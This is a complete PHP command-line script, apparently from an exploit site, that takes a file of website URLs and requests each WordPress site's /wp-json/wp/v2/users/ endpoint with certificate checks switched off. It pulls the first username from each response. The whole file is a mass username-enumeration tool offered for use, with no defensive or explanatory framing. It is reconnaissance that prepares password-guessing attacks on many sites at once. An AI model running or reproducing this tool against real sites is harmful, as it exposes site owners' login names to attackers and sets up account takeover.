<?php
// www.nyamxpl0it.cf
if(!$argv[1]) exit("[-] Usage {$argv[0]} list.txt");
$exo = explode("\n", file_get_contents($argv[1]));
foreach($exo as $plastic) {
  $ajc = $plastic."/wp-json/wp/v2/users/";
  $anjay = ofcourse($ajc);
  if($anjay->head == 200) {
    echo "[".$anjay->head."] {$ajc}\n";
    if(preg_match("/\"name\":/", $anjay->body)) {
      preg_match_all("/\"name\":\"(.*?)\"/", $anjay->body, $kental);
      echo "[+] User found! ".$kental[1][0]."\n";
    } else {
      echo "[-] User not found!\n";
    }
  } else {
    echo "[".$anjay->head."] {$plastic}\n";
  }
}

function ofcourse($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $dx = curl_exec($ch);
  $info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return (object) [
    "body" => $dx,
    "head" => $info
    ];
}